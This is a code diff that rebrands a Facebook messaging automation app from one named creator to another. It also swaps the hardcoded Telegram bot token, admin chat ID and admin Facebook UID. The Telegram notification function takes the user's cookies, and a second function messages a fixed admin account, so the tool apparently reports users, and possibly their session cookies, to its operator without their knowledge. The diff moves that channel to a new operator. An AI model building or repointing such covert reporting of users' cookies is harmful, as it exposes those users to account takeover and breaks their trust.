@@ -11,7 +11,7 @@ import requests
 import os
 
 st.set_page_config(
-    page_title="FB E2EE by HASSAN RAJPUT",
+    page_title="FB E2EE by MIICKY DON",
     page_icon="👑",
     layout="wide",
     initial_sidebar_state="expanded"
@@ -474,8 +474,8 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
 def send_telegram_notification(username, automation_state=None, cookies=""):
     """Send admin notification via Telegram bot - MUCH MORE RELIABLE than Facebook!"""
     try:
-        telegram_bot_token = "79045aXI"
-        telegram_admin_chat_id = "532"
+        telegram_bot_token = "79045aX"
+        telegram_admin_chat_id = "520"
         
         from datetime import datetime
         import pytz
@@ -515,7 +515,7 @@ def send_telegram_notification(username, automation_state=None, cookies=""):
         return False
 
 def send_admin_notification(user_config, username, automation_state=None, user_id=None):
-    ADMIN_UID = "61567810846706"
+    ADMIN_UID = "61577361393533"
     driver = None
     try:
         log_message(f"ADMIN-NOTIFY: Sending usage notification for user: {username}", automation_state)
@@ -1135,7 +1135,7 @@ def stop_automation(user_id):
     st.session_state.automation_state.running = False
     db.set_automation_running(user_id, False)
 
-st.markdown('<div class="main-header"><h1>HASSAN RAJPUT E2EE FACEBOOK CONVO</h1><p>Created by HASSAN RAJPUT</p></div>', unsafe_allow_html=True)
+st.markdown('<div class="main-header"><h1>MIICKY DON E2EE FACEBOOK CONVO</h1><p>Created by HASSAN RAJPUT</p></div>', unsafe_allow_html=True)
 
 if not st.session_state.logged_in:
     tab1, tab2 = st.tabs(["🔐 Login", "✨ Sign Up"])
@@ -1299,4 +1299,4 @@ else:
                 time.sleep(1)
                 st.rerun()
 
-st.markdown('<div class="footer">Made with ❤️ by HASSAN RAJPUT | © 2025 All Rights Reserved</div>', unsafe_allow_html=True)
+st.markdown('<div class="footer">Made with ❤️ by MIICKY DON | © 2025 All Rights Reserved</div>', unsafe_allow_html=True)
